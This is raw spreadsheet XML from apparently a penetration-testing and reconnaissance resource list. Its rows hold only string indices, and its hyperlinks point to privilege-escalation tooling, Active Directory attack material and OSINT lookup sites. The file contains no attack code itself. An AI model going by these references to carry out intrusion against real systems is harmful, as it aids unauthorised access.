      <c r="J50" s="45" t="s">
        <v>579</v>
      </c>
      <c r="K50" s="46" t="s">
        <v>580</v>
      </c>
      <c r="L50" s="18" t="s">
        <v>974</v>
      </c>
      <c r="V50" s="25" t="s">
        <v>563</v>
      </c>
      <c r="W50" s="26" t="s">
        <v>1036</v>
      </c>
      <c r="X50" s="27"/>
    </row>
    <row r="51" spans="1:24" ht="78.75">
      <c r="F51" s="15" t="s">
        <v>39</v>
      </c>
      <c r="G51" s="21" t="s">
        <v>895</v>
      </c>
      <c r="H51" s="12"/>
      <c r="J51" s="48" t="s">
        <v>595</v>
      </c>
      <c r="K51" s="21" t="s">
        <v>596</v>
      </c>
      <c r="L51" s="12" t="s">
        <v>597</v>
      </c>
      <c r="V51" s="17"/>
      <c r="W51" s="20"/>
      <c r="X51" s="18"/>
    </row>
    <row r="52" spans="1:24" ht="90">
      <c r="F52" s="17" t="s">
        <v>40</v>
      </c>
      <c r="G52" s="20" t="s">
        <v>896</v>
      </c>
      <c r="H52" s="18" t="s">
        <v>897</v>
      </c>
      <c r="J52" s="45" t="s">
        <v>635</v>
      </c>
      <c r="K52" s="46" t="s">
        <v>975</v>
      </c>
      <c r="L52" s="18" t="s">
        <v>976</v>
      </c>
    </row>
    <row r="53" spans="1:24" ht="56.25">
      <c r="F53" s="15" t="s">
        <v>41</v>
      </c>
      <c r="G53" s="21" t="s">
        <v>42</v>
      </c>
      <c r="H53" s="12"/>
      <c r="J53" s="48" t="s">
        <v>691</v>
      </c>
      <c r="K53" s="49" t="s">
        <v>977</v>
      </c>
      <c r="L53" s="12"/>
    </row>
    <row r="54" spans="1:24" ht="33.75">
      <c r="F54" s="17" t="s">
        <v>43</v>
      </c>
      <c r="G54" s="20" t="s">
        <v>898</v>
      </c>
      <c r="H54" s="18"/>
      <c r="J54" s="45" t="s">
        <v>690</v>
      </c>
      <c r="K54" s="46" t="s">
        <v>978</v>
      </c>
      <c r="L54" s="18" t="s">
        <v>979</v>
      </c>
    </row>
    <row r="55" spans="1:24" ht="45">
      <c r="F55" s="15" t="s">
        <v>44</v>
      </c>
      <c r="G55" s="21" t="s">
        <v>899</v>
      </c>
      <c r="H55" s="12" t="s">
        <v>900</v>
      </c>
      <c r="J55" s="48" t="s">
        <v>696</v>
      </c>
      <c r="K55" s="49" t="s">
        <v>697</v>
      </c>
      <c r="L55" s="12"/>
    </row>
    <row r="56" spans="1:24" ht="78.75">
      <c r="F56" s="17" t="s">
        <v>45</v>
      </c>
      <c r="G56" s="20" t="s">
        <v>46</v>
      </c>
      <c r="H56" s="18"/>
      <c r="J56" s="45" t="s">
        <v>700</v>
      </c>
      <c r="K56" s="46" t="s">
        <v>701</v>
      </c>
      <c r="L56" s="18"/>
    </row>
    <row r="57" spans="1:24" ht="45">
      <c r="F57" s="15" t="s">
        <v>47</v>
      </c>
      <c r="G57" s="21" t="s">
        <v>901</v>
      </c>
      <c r="H57" s="12" t="s">
        <v>140</v>
      </c>
      <c r="J57" s="48" t="s">
        <v>712</v>
      </c>
      <c r="K57" s="49" t="s">
        <v>713</v>
      </c>
      <c r="L57" s="12"/>
    </row>
    <row r="58" spans="1:24" ht="56.25">
      <c r="A58" s="13"/>
      <c r="F58" s="17" t="s">
        <v>132</v>
      </c>
      <c r="G58" s="20" t="s">
        <v>902</v>
      </c>
      <c r="H58" s="18"/>
      <c r="J58" s="45" t="s">
        <v>783</v>
      </c>
      <c r="K58" s="46" t="s">
        <v>980</v>
      </c>
      <c r="L58" s="18" t="s">
        <v>981</v>
      </c>
    </row>
    <row r="59" spans="1:24" ht="42">
      <c r="A59" s="13"/>
      <c r="F59" s="15" t="s">
        <v>133</v>
      </c>
      <c r="G59" s="21" t="s">
        <v>903</v>
      </c>
      <c r="H59" s="12"/>
      <c r="J59" s="48" t="s">
        <v>1433</v>
      </c>
      <c r="K59" s="49" t="s">
        <v>1434</v>
      </c>
      <c r="L59" s="12" t="s">
        <v>1435</v>
      </c>
    </row>
    <row r="60" spans="1:24" ht="45">
      <c r="A60" s="13"/>
      <c r="F60" s="17" t="s">
        <v>86</v>
      </c>
      <c r="G60" s="20" t="s">
        <v>904</v>
      </c>
      <c r="H60" s="18"/>
      <c r="J60" s="45" t="s">
        <v>1466</v>
      </c>
      <c r="K60" s="46" t="s">
        <v>1467</v>
      </c>
      <c r="L60" s="18"/>
    </row>
    <row r="61" spans="1:24" ht="33.75">
      <c r="A61" s="13"/>
      <c r="F61" s="15" t="s">
        <v>136</v>
      </c>
      <c r="G61" s="21" t="s">
        <v>905</v>
      </c>
      <c r="H61" s="12"/>
      <c r="J61" s="48" t="s">
        <v>1559</v>
      </c>
      <c r="K61" s="49" t="s">
        <v>1560</v>
      </c>
      <c r="L61" s="12"/>
    </row>
    <row r="62" spans="1:24" ht="33.75">
      <c r="A62" s="13"/>
      <c r="F62" s="17" t="s">
        <v>137</v>
      </c>
      <c r="G62" s="20" t="s">
        <v>906</v>
      </c>
      <c r="H62" s="18" t="s">
        <v>907</v>
      </c>
      <c r="J62" s="45" t="s">
        <v>1638</v>
      </c>
      <c r="K62" s="46" t="s">
        <v>1644</v>
      </c>
      <c r="L62" s="18" t="s">
        <v>1643</v>
      </c>
    </row>
    <row r="63" spans="1:24" ht="33.75">
      <c r="A63" s="13"/>
      <c r="F63" s="15" t="s">
        <v>138</v>
      </c>
      <c r="G63" s="21" t="s">
        <v>908</v>
      </c>
      <c r="H63" s="12"/>
      <c r="J63" s="48" t="s">
        <v>1919</v>
      </c>
      <c r="K63" s="49" t="s">
        <v>1920</v>
      </c>
      <c r="L63" s="12" t="s">
        <v>1921</v>
      </c>
    </row>
    <row r="64" spans="1:24" ht="22.5">
      <c r="A64" s="13"/>
      <c r="F64" s="17" t="s">
        <v>139</v>
      </c>
      <c r="G64" s="20" t="s">
        <v>909</v>
      </c>
      <c r="H64" s="18"/>
    </row>
    <row r="65" spans="1:12" ht="22.5">
      <c r="A65" s="13"/>
      <c r="F65" s="15" t="s">
        <v>141</v>
      </c>
      <c r="G65" s="21" t="s">
        <v>910</v>
      </c>
      <c r="H65" s="12"/>
    </row>
    <row r="66" spans="1:12" ht="22.5">
      <c r="A66" s="13"/>
      <c r="F66" s="17" t="s">
        <v>142</v>
      </c>
      <c r="G66" s="20" t="s">
        <v>911</v>
      </c>
      <c r="H66" s="18"/>
    </row>
    <row r="67" spans="1:12" ht="33.75">
      <c r="A67" s="13"/>
      <c r="F67" s="15" t="s">
        <v>143</v>
      </c>
      <c r="G67" s="21" t="s">
        <v>144</v>
      </c>
      <c r="H67" s="12"/>
    </row>
    <row r="68" spans="1:12" ht="79.5" thickBot="1">
      <c r="A68" s="13"/>
      <c r="F68" s="17" t="s">
        <v>165</v>
      </c>
      <c r="G68" s="20" t="s">
        <v>913</v>
      </c>
      <c r="H68" s="18" t="s">
        <v>912</v>
      </c>
      <c r="J68" s="72" t="s">
        <v>126</v>
      </c>
      <c r="K68" s="72"/>
      <c r="L68" s="72"/>
    </row>
    <row r="69" spans="1:12" ht="31.5">
      <c r="A69" s="13"/>
      <c r="F69" s="15" t="s">
        <v>210</v>
      </c>
      <c r="G69" s="21" t="s">
        <v>914</v>
      </c>
      <c r="H69" s="12" t="s">
        <v>915</v>
      </c>
      <c r="J69" s="14" t="s">
        <v>1042</v>
      </c>
      <c r="K69" s="16" t="s">
        <v>2</v>
      </c>
      <c r="L69" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="70" spans="1:12" ht="52.5">
      <c r="A70" s="13"/>
      <c r="F70" s="17" t="s">
        <v>213</v>
      </c>
      <c r="G70" s="20" t="s">
        <v>916</v>
      </c>
      <c r="H70" s="18" t="s">
        <v>944</v>
      </c>
      <c r="J70" s="15" t="s">
        <v>984</v>
      </c>
      <c r="K70" s="19" t="s">
        <v>983</v>
      </c>
      <c r="L70" s="11"/>
    </row>
    <row r="71" spans="1:12" ht="22.5">
      <c r="A71" s="13"/>
      <c r="F71" s="15" t="s">
        <v>236</v>
      </c>
      <c r="G71" s="21" t="s">
        <v>917</v>
      </c>
      <c r="H71" s="12"/>
      <c r="J71" s="17" t="s">
        <v>985</v>
      </c>
      <c r="K71" s="20" t="s">
        <v>361</v>
      </c>
      <c r="L71" s="18" t="s">
        <v>365</v>
      </c>
    </row>
    <row r="72" spans="1:12" ht="33.75">
      <c r="A72" s="13"/>
      <c r="F72" s="17" t="s">
        <v>239</v>
      </c>
      <c r="G72" s="20" t="s">
        <v>918</v>
      </c>
      <c r="H72" s="18"/>
      <c r="J72" s="15" t="s">
        <v>986</v>
      </c>
      <c r="K72" s="21" t="s">
        <v>364</v>
      </c>
      <c r="L72" s="12" t="s">
        <v>365</v>
      </c>
    </row>
    <row r="73" spans="1:12" ht="34.5" thickBot="1">
      <c r="A73" s="13"/>
      <c r="F73" s="15" t="s">
        <v>347</v>
      </c>
      <c r="G73" s="21" t="s">
        <v>919</v>
      </c>
      <c r="H73" s="12"/>
      <c r="J73" s="22"/>
      <c r="K73" s="23"/>
      <c r="L73" s="24"/>
    </row>
    <row r="74" spans="1:12">
      <c r="A74" s="13"/>
      <c r="F74" s="45" t="s">
        <v>477</v>
      </c>
      <c r="G74" s="46" t="s">
        <v>920</v>
      </c>
      <c r="H74" s="18"/>
    </row>
    <row r="75" spans="1:12" ht="33.75">
      <c r="A75" s="13"/>
      <c r="F75" s="48" t="s">
        <v>576</v>
      </c>
      <c r="G75" s="49" t="s">
        <v>921</v>
      </c>
      <c r="H75" s="12"/>
    </row>
    <row r="76" spans="1:12" ht="45">
      <c r="A76" s="13"/>
      <c r="F76" s="45" t="s">
        <v>581</v>
      </c>
      <c r="G76" s="46" t="s">
        <v>922</v>
      </c>
      <c r="H76" s="18" t="s">
        <v>923</v>
      </c>
    </row>
    <row r="77" spans="1:12" ht="22.5">
      <c r="A77" s="13"/>
      <c r="F77" s="48" t="s">
        <v>583</v>
      </c>
      <c r="G77" s="49" t="s">
        <v>924</v>
      </c>
      <c r="H77" s="12"/>
    </row>
    <row r="78" spans="1:12" ht="67.5">
      <c r="A78" s="13"/>
      <c r="F78" s="45" t="s">
        <v>608</v>
      </c>
      <c r="G78" s="46" t="s">
        <v>925</v>
      </c>
      <c r="H78" s="18"/>
    </row>
    <row r="79" spans="1:12" ht="45">
      <c r="A79" s="13"/>
      <c r="F79" s="48" t="s">
        <v>616</v>
      </c>
      <c r="G79" s="49" t="s">
        <v>926</v>
      </c>
      <c r="H79" s="12"/>
    </row>
    <row r="80" spans="1:12" ht="45">
      <c r="A80" s="13"/>
      <c r="F80" s="45" t="s">
        <v>617</v>
      </c>
      <c r="G80" s="46" t="s">
        <v>927</v>
      </c>
      <c r="H80" s="18"/>
    </row>
    <row r="81" spans="1:8" ht="22.5">
      <c r="A81" s="13"/>
      <c r="F81" s="48" t="s">
        <v>641</v>
      </c>
      <c r="G81" s="49" t="s">
        <v>928</v>
      </c>
      <c r="H81" s="12"/>
    </row>
    <row r="82" spans="1:8" ht="33.75">
      <c r="A82" s="13"/>
      <c r="F82" s="45" t="s">
        <v>655</v>
      </c>
      <c r="G82" s="46" t="s">
        <v>930</v>
      </c>
      <c r="H82" s="18" t="s">
        <v>656</v>
      </c>
    </row>
    <row r="83" spans="1:8" ht="45">
      <c r="A83" s="13"/>
      <c r="F83" s="48" t="s">
        <v>657</v>
      </c>
      <c r="G83" s="49" t="s">
        <v>929</v>
      </c>
      <c r="H83" s="12" t="s">
        <v>933</v>
      </c>
    </row>
    <row r="84" spans="1:8" ht="52.5">
      <c r="A84" s="13"/>
      <c r="F84" s="45" t="s">
        <v>658</v>
      </c>
      <c r="G84" s="46" t="s">
        <v>931</v>
      </c>
      <c r="H84" s="18" t="s">
        <v>932</v>
      </c>
    </row>
    <row r="85" spans="1:8" ht="94.5">
      <c r="F85" s="48" t="s">
        <v>676</v>
      </c>
      <c r="G85" s="49" t="s">
        <v>778</v>
      </c>
      <c r="H85" s="12" t="s">
        <v>934</v>
      </c>
    </row>
    <row r="86" spans="1:8" ht="73.5">
      <c r="F86" s="45" t="s">
        <v>714</v>
      </c>
      <c r="G86" s="46" t="s">
        <v>1504</v>
      </c>
      <c r="H86" s="18" t="s">
        <v>935</v>
      </c>
    </row>
    <row r="87" spans="1:8" ht="22.5">
      <c r="F87" s="48" t="s">
        <v>937</v>
      </c>
      <c r="G87" s="49" t="s">
        <v>936</v>
      </c>
      <c r="H87" s="12"/>
    </row>
    <row r="88" spans="1:8" ht="22.5">
      <c r="F88" s="45" t="s">
        <v>716</v>
      </c>
      <c r="G88" s="46" t="s">
        <v>938</v>
      </c>
      <c r="H88" s="18"/>
    </row>
    <row r="89" spans="1:8" ht="45">
      <c r="F89" s="48" t="s">
        <v>780</v>
      </c>
      <c r="G89" s="49" t="s">
        <v>939</v>
      </c>
      <c r="H89" s="12"/>
    </row>
    <row r="90" spans="1:8" ht="56.25">
      <c r="F90" s="45" t="s">
        <v>526</v>
      </c>
      <c r="G90" s="46" t="s">
        <v>940</v>
      </c>
      <c r="H90" s="18"/>
    </row>
    <row r="91" spans="1:8" ht="67.5">
      <c r="F91" s="48" t="s">
        <v>789</v>
      </c>
      <c r="G91" s="49" t="s">
        <v>941</v>
      </c>
      <c r="H91" s="12"/>
    </row>
    <row r="92" spans="1:8" ht="42">
      <c r="F92" s="45" t="s">
        <v>797</v>
      </c>
      <c r="G92" s="46" t="s">
        <v>942</v>
      </c>
      <c r="H92" s="18" t="s">
        <v>943</v>
      </c>
    </row>
    <row r="93" spans="1:8" ht="22.5">
      <c r="F93" s="48" t="s">
        <v>1572</v>
      </c>
      <c r="G93" s="49" t="s">
        <v>1384</v>
      </c>
      <c r="H93" s="12"/>
    </row>
    <row r="94" spans="1:8" ht="56.25">
      <c r="F94" s="45" t="s">
        <v>1385</v>
      </c>
      <c r="G94" s="46" t="s">
        <v>1386</v>
      </c>
      <c r="H94" s="18"/>
    </row>
    <row r="95" spans="1:8" ht="73.5">
      <c r="F95" s="48" t="s">
        <v>1497</v>
      </c>
      <c r="G95" s="49" t="s">
        <v>1498</v>
      </c>
      <c r="H95" s="12" t="s">
        <v>1499</v>
      </c>
    </row>
    <row r="96" spans="1:8" ht="45">
      <c r="F96" s="45" t="s">
        <v>1505</v>
      </c>
      <c r="G96" s="46" t="s">
        <v>1506</v>
      </c>
      <c r="H96" s="18"/>
    </row>
    <row r="97" spans="6:8" ht="33.75">
      <c r="F97" s="48" t="s">
        <v>1617</v>
      </c>
      <c r="G97" s="49" t="s">
        <v>1615</v>
      </c>
      <c r="H97" s="12"/>
    </row>
    <row r="98" spans="6:8" ht="33.75">
      <c r="F98" s="45" t="s">
        <v>1616</v>
      </c>
      <c r="G98" s="46" t="s">
        <v>1618</v>
      </c>
      <c r="H98" s="18"/>
    </row>
    <row r="99" spans="6:8" ht="105">
      <c r="F99" s="48" t="s">
        <v>1635</v>
      </c>
      <c r="G99" s="49" t="s">
        <v>1636</v>
      </c>
      <c r="H99" s="12" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="100" spans="6:8" ht="45">
      <c r="F100" s="45" t="s">
        <v>1653</v>
      </c>
      <c r="G100" s="46" t="s">
        <v>1654</v>
      </c>
      <c r="H100" s="18"/>
    </row>
  </sheetData>
  <mergeCells count="21">
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="F2:H2"/>
    <mergeCell ref="B1:D2"/>
    <mergeCell ref="F38:H38"/>
    <mergeCell ref="J2:L2"/>
    <mergeCell ref="J11:L11"/>
    <mergeCell ref="J21:L21"/>
    <mergeCell ref="Z26:AB26"/>
    <mergeCell ref="Z38:AB38"/>
    <mergeCell ref="N2:P2"/>
    <mergeCell ref="N18:P18"/>
    <mergeCell ref="J68:L68"/>
    <mergeCell ref="Z2:AB2"/>
    <mergeCell ref="V2:X2"/>
    <mergeCell ref="R2:T2"/>
    <mergeCell ref="R16:T16"/>
    <mergeCell ref="Z21:AB21"/>
    <mergeCell ref="V35:X35"/>
    <mergeCell ref="N26:P26"/>
    <mergeCell ref="R28:T28"/>
    <mergeCell ref="V46:X46"/>
  </mergeCells>
  <hyperlinks>
    <hyperlink ref="J8" r:id="rId1"/>
    <hyperlink ref="B36" r:id="rId2"/>
    <hyperlink ref="B37" r:id="rId3"/>
    <hyperlink ref="J39" r:id="rId4" display="https://github.com/ngalongc/AutoLocalPrivilegeEscalation"/>
    <hyperlink ref="Z5" r:id="rId5"/>
    <hyperlink ref="AB5" r:id="rId6"/>
    <hyperlink ref="Z9" r:id="rId7"/>
    <hyperlink ref="Z11" r:id="rId8"/>
    <hyperlink ref="Z12" r:id="rId9"/>
    <hyperlink ref="Z10" r:id="rId10"/>
    <hyperlink ref="Z4" r:id="rId11"/>
    <hyperlink ref="J70" r:id="rId12"/>
    <hyperlink ref="J71" r:id="rId13"/>
    <hyperlink ref="J72" r:id="rId14"/>
    <hyperlink ref="T22" r:id="rId15"/>
    <hyperlink ref="Z17" r:id="rId16" location="top" display="https://0xsp.com/offensive/active-directory-attack-defense - top"/>
    <hyperlink ref="Z18" r:id="rId17"/>
    <hyperlink ref="Z19" r:id="rId18"/>
    <hyperlink ref="R12" r:id="rId19"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" horizontalDpi="0" verticalDpi="0" r:id="rId2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28"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F10" sqref="F10"/>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65" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="66"/>
      <c r="D1" s="67"/>
    </row>
    <row r="2" spans="2:12" ht="15.75" thickBot="1">
      <c r="B2" s="68"/>
      <c r="C2" s="69"/>
      <c r="D2" s="70"/>
      <c r="F2" s="72" t="s">
        <v>48</v>
      </c>
      <c r="G2" s="72"/>
      <c r="H2" s="72"/>
    </row>
    <row r="3" spans="2:12" ht="19.5" thickBot="1">
      <c r="B3" s="1"/>
      <c r="C3" s="2"/>
      <c r="D3" s="3"/>
      <c r="F3" s="14" t="s">
        <v>1</v>
      </c>
      <c r="G3" s="32" t="s">
        <v>2</v>
      </c>
      <c r="H3" s="10" t="s">
        <v>3</v>
      </c>
      <c r="J3" s="72" t="s">
        <v>352</v>
      </c>
      <c r="K3" s="72"/>
      <c r="L3" s="72"/>
    </row>
    <row r="4" spans="2:12" ht="33.75">
      <c r="B4" s="1"/>
      <c r="C4" s="2"/>
      <c r="D4" s="3"/>
      <c r="F4" s="15" t="s">
        <v>49</v>
      </c>
      <c r="G4" s="31" t="s">
        <v>50</v>
      </c>
      <c r="H4" s="12" t="s">
        <v>51</v>
      </c>
      <c r="J4" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K4" s="32" t="s">
        <v>2</v>
      </c>
      <c r="L4" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="5" spans="2:12" ht="34.5" thickBot="1">
      <c r="B5" s="1"/>
      <c r="C5" s="2"/>
      <c r="D5" s="3"/>
      <c r="F5" s="17" t="s">
        <v>52</v>
      </c>
      <c r="G5" s="20" t="s">
        <v>53</v>
      </c>
      <c r="H5" s="18" t="s">
        <v>1067</v>
      </c>
      <c r="J5" s="33" t="s">
        <v>353</v>
      </c>
      <c r="K5" s="34" t="s">
        <v>351</v>
      </c>
      <c r="L5" s="35"/>
    </row>
    <row r="6" spans="2:12" ht="45">
      <c r="B6" s="1"/>
      <c r="C6" s="2"/>
      <c r="D6" s="3"/>
      <c r="F6" s="15" t="s">
        <v>54</v>
      </c>
      <c r="G6" s="21" t="s">
        <v>1068</v>
      </c>
      <c r="H6" s="12" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="7" spans="2:12" ht="45.75" thickBot="1">
      <c r="B7" s="1"/>
      <c r="C7" s="2"/>
      <c r="D7" s="3"/>
      <c r="F7" s="17" t="s">
        <v>56</v>
      </c>
      <c r="G7" s="20" t="s">
        <v>58</v>
      </c>
      <c r="H7" s="18" t="s">
        <v>57</v>
      </c>
      <c r="J7" s="72" t="s">
        <v>1446</v>
      </c>
      <c r="K7" s="72"/>
      <c r="L7" s="72"/>
    </row>
    <row r="8" spans="2:12" ht="33.75">
      <c r="B8" s="1"/>
      <c r="C8" s="2"/>
      <c r="D8" s="3"/>
      <c r="F8" s="15" t="s">
        <v>59</v>
      </c>
      <c r="G8" s="21" t="s">
        <v>1065</v>
      </c>
      <c r="H8" s="12" t="s">
        <v>57</v>
      </c>
      <c r="J8" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K8" s="32" t="s">
        <v>2</v>
      </c>
      <c r="L8" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="9" spans="2:12" ht="33.75">
      <c r="B9" s="1"/>
      <c r="C9" s="2"/>
      <c r="D9" s="3"/>
      <c r="F9" s="17" t="s">
        <v>356</v>
      </c>
      <c r="G9" s="20" t="s">
        <v>1066</v>
      </c>
      <c r="H9" s="18"/>
      <c r="J9" s="15" t="s">
        <v>358</v>
      </c>
      <c r="K9" s="31" t="s">
        <v>359</v>
      </c>
      <c r="L9" s="12"/>
    </row>
    <row r="10" spans="2:12" ht="63">
      <c r="B10" s="1"/>
      <c r="C10" s="2"/>
      <c r="D10" s="3"/>
      <c r="F10" s="15" t="s">
        <v>1538</v>
      </c>
      <c r="G10" s="21" t="s">
        <v>1539</v>
      </c>
      <c r="H10" s="12"/>
      <c r="J10" s="17" t="s">
        <v>1494</v>
      </c>
      <c r="K10" s="20" t="s">
        <v>1495</v>
      </c>
      <c r="L10" s="18" t="s">
        <v>1496</v>
      </c>
    </row>
    <row r="11" spans="2:12" ht="45">
      <c r="B11" s="1"/>
      <c r="C11" s="2"/>
      <c r="D11" s="3"/>
      <c r="F11" s="17" t="s">
        <v>1540</v>
      </c>
      <c r="G11" s="20" t="s">
        <v>1541</v>
      </c>
      <c r="H11" s="18"/>
    </row>
    <row r="12" spans="2:12" ht="18.75">
      <c r="B12" s="1"/>
      <c r="C12" s="2"/>
      <c r="D12" s="3"/>
      <c r="F12" s="15"/>
      <c r="G12" s="21"/>
      <c r="H12" s="12"/>
    </row>
    <row r="13" spans="2:12" ht="19.5" thickBot="1">
      <c r="B13" s="1"/>
      <c r="C13" s="2"/>
      <c r="D13" s="3"/>
      <c r="F13" s="22"/>
      <c r="G13" s="23"/>
      <c r="H13" s="24"/>
    </row>
    <row r="14" spans="2:12" ht="19.5" thickBot="1">
      <c r="B14" s="1"/>
      <c r="C14" s="2"/>
      <c r="D14" s="3"/>
      <c r="J14" s="72" t="s">
        <v>759</v>
      </c>
      <c r="K14" s="72"/>
      <c r="L14" s="72"/>
    </row>
    <row r="15" spans="2:12" ht="18.75">
      <c r="B15" s="1"/>
      <c r="C15" s="2"/>
      <c r="D15" s="3"/>
      <c r="J15" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K15" s="32" t="s">
        <v>2</v>
      </c>
      <c r="L15" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="16" spans="2:12" ht="23.25" thickBot="1">
      <c r="B16" s="1"/>
      <c r="C16" s="2"/>
      <c r="D16" s="3"/>
      <c r="F16" s="72" t="s">
        <v>1542</v>
      </c>
      <c r="G16" s="72"/>
      <c r="H16" s="72"/>
      <c r="J16" s="33" t="s">
        <v>757</v>
      </c>
      <c r="K16" s="34" t="s">
        <v>758</v>
      </c>
      <c r="L16" s="35"/>
    </row>
    <row r="17" spans="2:12" ht="18.75">
      <c r="B17" s="1"/>
      <c r="C17" s="2"/>
      <c r="D17" s="3"/>
      <c r="F17" s="14" t="s">
        <v>1042</v>
      </c>
      <c r="G17" s="32" t="s">
        <v>2</v>
      </c>
      <c r="H17" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="18" spans="2:12" ht="23.25" thickBot="1">
      <c r="B18" s="1"/>
      <c r="C18" s="2"/>
      <c r="D18" s="3"/>
      <c r="F18" s="15" t="s">
        <v>316</v>
      </c>
      <c r="G18" s="31" t="s">
        <v>1069</v>
      </c>
      <c r="H18" s="12"/>
      <c r="J18" s="72" t="s">
        <v>760</v>
      </c>
      <c r="K18" s="72"/>
      <c r="L18" s="72"/>
    </row>
    <row r="19" spans="2:12" ht="22.5">
      <c r="B19" s="1"/>
      <c r="C19" s="2"/>
      <c r="D19" s="3"/>
      <c r="F19" s="17" t="s">
        <v>317</v>
      </c>
      <c r="G19" s="20" t="s">
        <v>1070</v>
      </c>
      <c r="H19" s="18" t="s">
        <v>318</v>
      </c>
      <c r="J19" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K19" s="32" t="s">
        <v>2</v>
      </c>
      <c r="L19" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="20" spans="2:12" ht="34.5" thickBot="1">
      <c r="B20" s="1"/>
      <c r="C20" s="2"/>
      <c r="D20" s="3"/>
      <c r="F20" s="15" t="s">
        <v>1073</v>
      </c>
      <c r="G20" s="21" t="s">
        <v>1070</v>
      </c>
      <c r="H20" s="12" t="s">
        <v>1072</v>
      </c>
      <c r="J20" s="33" t="s">
        <v>761</v>
      </c>
      <c r="K20" s="34" t="s">
        <v>762</v>
      </c>
      <c r="L20" s="35"/>
    </row>
    <row r="21" spans="2:12" ht="22.5">
      <c r="B21" s="1"/>
      <c r="C21" s="2"/>
      <c r="D21" s="3"/>
      <c r="F21" s="17" t="s">
        <v>357</v>
      </c>
      <c r="G21" s="20" t="s">
        <v>1071</v>
      </c>
      <c r="H21" s="18"/>
    </row>
    <row r="22" spans="2:12" ht="34.5" thickBot="1">
      <c r="B22" s="1"/>
      <c r="C22" s="2"/>
      <c r="D22" s="3"/>
      <c r="F22" s="15" t="s">
        <v>1543</v>
      </c>
      <c r="G22" s="21" t="s">
        <v>1544</v>
      </c>
      <c r="H22" s="12"/>
      <c r="J22" s="72" t="s">
        <v>1555</v>
      </c>
      <c r="K22" s="72"/>
      <c r="L22" s="72"/>
    </row>
    <row r="23" spans="2:12" ht="22.5">
      <c r="B23" s="4"/>
      <c r="C23" s="5"/>
      <c r="D23" s="6"/>
      <c r="F23" s="17" t="s">
        <v>1545</v>
      </c>
      <c r="G23" s="20" t="s">
        <v>725</v>
      </c>
      <c r="H23" s="18"/>
      <c r="J23" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K23" s="32" t="s">
        <v>2</v>
      </c>
      <c r="L23" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="24" spans="2:12" ht="68.25" thickBot="1">
      <c r="B24" s="4"/>
      <c r="C24" s="5"/>
      <c r="D24" s="6"/>
      <c r="F24" s="15" t="s">
        <v>1546</v>
      </c>
      <c r="G24" s="21" t="s">
        <v>1547</v>
      </c>
      <c r="H24" s="12"/>
      <c r="J24" s="33" t="s">
        <v>1556</v>
      </c>
      <c r="K24" s="34" t="s">
        <v>1557</v>
      </c>
      <c r="L24" s="35" t="s">
        <v>1558</v>
      </c>
    </row>
    <row r="25" spans="2:12" ht="45.75" thickBot="1">
      <c r="B25" s="7"/>
      <c r="C25" s="8"/>
      <c r="D25" s="9"/>
      <c r="F25" s="17" t="s">
        <v>1548</v>
      </c>
      <c r="G25" s="20" t="s">
        <v>1549</v>
      </c>
      <c r="H25" s="18"/>
    </row>
    <row r="26" spans="2:12" ht="56.25">
      <c r="F26" s="15" t="s">
        <v>1550</v>
      </c>
      <c r="G26" s="21" t="s">
        <v>1551</v>
      </c>
      <c r="H26" s="12"/>
    </row>
    <row r="27" spans="2:12" ht="31.5">
      <c r="F27" s="17" t="s">
        <v>1552</v>
      </c>
      <c r="G27" s="20" t="s">
        <v>1553</v>
      </c>
      <c r="H27" s="18" t="s">
        <v>1554</v>
      </c>
    </row>
    <row r="28" spans="2:12" ht="33.75">
      <c r="F28" s="15" t="s">
        <v>1561</v>
      </c>
      <c r="G28" s="21" t="s">
        <v>1562</v>
      </c>
      <c r="H28" s="12" t="s">
        <v>1563</v>
      </c>
    </row>
  </sheetData>
  <mergeCells count="8">
    <mergeCell ref="J22:L22"/>
    <mergeCell ref="J18:L18"/>
    <mergeCell ref="B1:D2"/>
    <mergeCell ref="F2:H2"/>
    <mergeCell ref="F16:H16"/>
    <mergeCell ref="J3:L3"/>
    <mergeCell ref="J7:L7"/>
    <mergeCell ref="J14:L14"/>
  </mergeCells>
  <hyperlinks>
    <hyperlink ref="F19" r:id="rId1"/>
    <hyperlink ref="F21" r:id="rId2" display="http://ipv4info.com/"/>
    <hyperlink ref="F20" r:id="rId3"/>
    <hyperlink ref="F18" r:id="rId4" display="https://whois.domaintools.com/"/>
    <hyperlink ref="F22" r:id="rId5" display="https://checkusernames.com/"/>
    <hyperlink ref="F23" r:id="rId6"/>
    <hyperlink ref="F24" r:id="rId7"/>
    <hyperlink ref="F25" r:id="rId8"/>
    <hyperlink ref="F26" r:id="rId9"/>
    <hyperlink ref="F27" r:id="rId10"/>
    <hyperlink ref="F28" r:id="rId11"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" horizontalDpi="0" verticalDpi="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AR48"/>
  <sheetViews>
    <sheetView topLeftCell="A25" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="H38" sqref="H38"/>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s>
  <sheetData>
    <row r="1" spans="2:44">
      <c r="B1" s="65" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="66"/>
      <c r="D1" s="67"/>
      <c r="AR1" s="13"/>
    </row>
    <row r="2" spans="2:44" ht="15.75" thickBot="1">
      <c r="B2" s="68"/>
      <c r="C2" s="69"/>
      <c r="D2" s="70"/>
      <c r="F2" s="72" t="s">
        <v>60</v>
      </c>
      <c r="G2" s="72"/>
      <c r="H2" s="72"/>
      <c r="J2" s="72" t="s">
        <v>78</v>
      </c>
